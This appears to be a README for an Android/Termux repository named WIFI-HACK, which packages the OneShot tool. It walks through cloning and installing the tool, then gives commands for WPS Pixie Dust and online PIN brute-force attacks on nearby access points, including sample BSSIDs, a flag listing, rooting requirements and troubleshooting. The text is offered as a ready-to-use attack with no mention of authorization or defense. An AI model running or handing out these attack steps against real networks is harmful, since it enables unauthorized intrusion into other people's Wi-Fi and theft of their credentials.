# Setup
```
pkg update && pkg upgrade -y
```
```
pkg install git -y
```
```
pkg install python -y
```
```
git clone https://github.com/ALAMIN-2K07/WIFI-HACK
```
```
cd WIFI-HACK
```
```
ls
```
```
chmod +x oneshot.py
```
```
ls
```
```
bash installer.sh
```
```
cd WIFI-HACK
```
```
ls
```
```
sudo python oneshot.py -i wlan0 -K
```

## [Brute Force]
```
cd WIFI-HACK
```
```
ls
```
```
sudo python oneshot.py -i wlan0 -K
```
Now we will copy the BSSID, which will look a bit like a MAC address. Example: B4:0F:3B:57:F0:90 -B

Then we will press Ctrl + C, which will close the tool.

Then we will move to the home directory with the ```cd``` command.
```
cd WIFI-HACK
```
```
sudo python oneshot.py -i wlan0 -b (BSSID) -B
```

## [What is needed]
Mobile must be rooted.

need to flash the Busy Box module in the magisk app.
[BusyBox](https://downloads.sourceforge.net/project/magiskfiles/module-uploads/busybox-ndk-13016.zip?ts=gAAAAABoUawiHNA0RcCUZkQCmzFX1VHF8eXVr8-mDAw0nSBMpqcEjeIdA5op6ADzSTF99N89Qbu0w5JOghLJU-hm68MYOX3P7w%3D%3D&use_mirror=netix&r=https%3A%2F%2Fmagiskmodule.gitlab.io%2F)

When giving the last command, you need to turn off WiFi and data connection and turn on hotspot.

# Usage
```
 oneshot.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 oneshot.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 oneshot.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running OneShot with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
